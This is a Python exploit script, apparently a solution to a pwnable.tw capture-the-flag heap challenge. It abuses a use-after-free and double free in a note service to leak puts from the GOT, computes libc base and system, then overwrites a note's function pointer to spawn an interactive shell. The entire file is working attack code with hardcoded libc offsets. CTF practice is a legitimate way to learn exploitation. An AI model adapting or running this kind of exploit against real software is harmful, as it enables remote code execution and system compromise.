import socket
import struct
import telnetlib

# SERVER = ('localhost', 1234)
SERVER = ('chall.pwnable.tw', 10102)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(SERVER)
s.settimeout(2)

def _recv(sock):
    data = b''
    try:
        data = sock.recv(1024)
    except socket.timeout:
        pass
    return data

def alloc(size: int, data: bytes):
    _recv(s)
    s.send(b'1\n')
    _recv(s)
    s.send('{}\n'.format(size).encode('utf-8'))
    _recv(s)
    s.send(data)

def free(idx):
    _recv(s)
    s.send(b'2\n')
    _recv(s)
    s.send('{}\n'.format(idx).encode('utf-8'))

def read(idx):
    _recv(s)
    s.send(b'3\n')
    _recv(s)
    s.send('{}\n'.format(idx).encode('utf-8'))
    data = _recv(s)
    data = _recv(s)
    return data

alloc(16, b'a\x00')
alloc(16, b'b\x00')
alloc(16, b'c\x00')
free(0)
free(1)
free(0)
free(2)
free(1)
# 0x0804862b: puts(...)
# 0x0804a024: puts@GOT
buf = b''
buf += struct.pack('<I', 0x0804862b)
buf += struct.pack('<I', 0x0804a024)
alloc(8, buf)
data = read(2)

if b'Index' in data:
    data = data.split(b'Index :')[1][:4]
else:
    data = data[:4]

puts_libc = struct.unpack('<I', data)[0]
# puts_offset = 0x0005fca0
puts_offset = 0x0005f140
libc_base = puts_libc - puts_offset
# system_offset = 0x0003ada0
system_offset = 0x0003a940
system_libc = libc_base + system_offset

print('[+] libc base: {}'.format(hex(libc_base)))
print('[+] system@libc: {}'.format(hex(system_libc)))

buf = b''
buf += struct.pack('<I', system_libc)
buf += b';sh\x00'
alloc(8, buf)
read(1)

print('[*] Spawning shell')

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
